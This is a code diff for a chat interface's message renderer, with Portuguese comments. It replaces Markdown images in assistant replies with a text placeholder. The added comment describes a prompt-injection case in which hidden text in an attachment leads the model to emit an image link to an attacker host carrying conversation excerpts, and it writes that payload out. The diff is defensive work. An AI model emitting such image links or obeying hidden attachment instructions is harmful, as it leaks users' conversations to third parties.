@@ -14,6 +14,18 @@ const rehypePlugins = [rehypeSanitize]
 const CITE = "cite-"
 
 /**
+ * Imagem em resposta de modelo vira o texto alternativo — nunca uma requisição. O
+ * `rehypeSanitize` deixa `![](https://…)` passar (é Markdown válido), e o navegador busca a
+ * URL sozinho, sem clique e já durante o streaming. Um anexo com texto oculto que convença o
+ * modelo a responder `![](https://atacante/?d=<trecho da conversa>)` exfiltraria o conteúdo
+ * pela própria requisição da imagem. Nenhuma resposta do assistente precisa de imagem. Mesmo
+ * padrão do `ModelImagePlaceholder` do portal.
+ */
+function ModelImagePlaceholder({ alt }: { alt?: string }) {
+	return <span className="text-muted-foreground italic">[imagem{alt ? `: ${alt}` : ""}]</span>
+}
+
+/**
  * Corpo de uma resposta do assistente: markdown, com os rótulos `[N1]`/`[A2]`/`[D1:3]`
  * virando marcadores clicáveis e os blocos ` ```redacao ` virando cartões copiáveis.
  *
@@ -53,6 +65,7 @@ export function MessageBody({ content, citations, onCite }: { content: string; c
 		h3: ({ children }) => <p className="mb-2 font-semibold">{children}</p>,
 		code: ({ children }) => <code className="bg-muted px-1 font-mono text-[0.85em]">{children}</code>,
 		blockquote: ({ children }) => <blockquote className="mb-3 border-border border-l-2 pl-3 text-muted-foreground">{children}</blockquote>,
+		img: ({ alt }) => <ModelImagePlaceholder alt={alt} />,
 	}
 
 	const withChips = (text: string) =>
